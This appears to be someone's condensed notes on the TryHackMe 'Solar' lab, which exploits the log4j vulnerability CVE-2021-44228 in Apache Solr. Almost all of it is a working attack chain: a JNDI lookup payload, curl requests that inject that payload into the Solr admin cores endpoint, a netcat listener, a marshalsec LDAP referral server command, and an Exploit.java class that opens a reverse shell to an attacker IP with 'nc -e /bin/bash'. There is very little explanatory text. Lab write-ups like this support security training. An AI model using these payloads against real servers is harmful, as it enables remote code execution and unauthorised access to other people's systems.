[TryHackMe | Solar, exploiting log4j](https://tryhackme.com/room/solar)

**Solar, exploiting log4j**

*Explore CVE-2021-44228, a vulnerability in log4j affecting almost all software under the sun.*

![[Pasted image 20230606100110.png]]

`http://10.10.85.5:8983`

`http://10.10.85.5:8983/solr/#/`

![[Pasted image 20230606100945.png]]

`http://10.10.85.5:8983/solr/admin/cores`

![[Pasted image 20230606101210.png]]

`${jndi:ldap://ATTACKERCONTROLLEDHOST}`

```
nc -vnlp 9999
```

```shell-session
curl 'http://10.10.85.5:8983/solr/admin/cores?foo=$\{jndi:ldap://YOUR.ATTACKER.IP.ADDRESS:9999\}'
```

```
curl 'http://10.10.85.5:8983/solr/admin/cores?foo=$\{jndi:ldap://10.17.44.152:9999\}'
```

![[Pasted image 20230606101814.png]]

![[Pasted image 20230606101903.png]]

```shell-session
java -cp target/marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer "http://YOUR.ATTACKER.IP.ADDRESS:8000/#Exploit"
```

```
java -cp target/marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer "http://10.10.239.89:8000/#Exploit"
```

*Exploit.java*

```shell-session
public class Exploit {
    static {
        try {
            java.lang.Runtime.getRuntime().exec("nc -e /bin/bash YOUR.ATTACKER.IP.ADDRESS 9999");
        } catch (Exception e) {
            e.printStackTrace();
        }
    }
}
```

```
public class Exploit {
    static {
        try {
            java.lang.Runtime.getRuntime().exec("nc -e /bin/bash YOUR.ATTACKER.IP.ADDRESS 9999");
        } catch (Exception e) {
            e.printStackTrace();
        }
    }
}
```

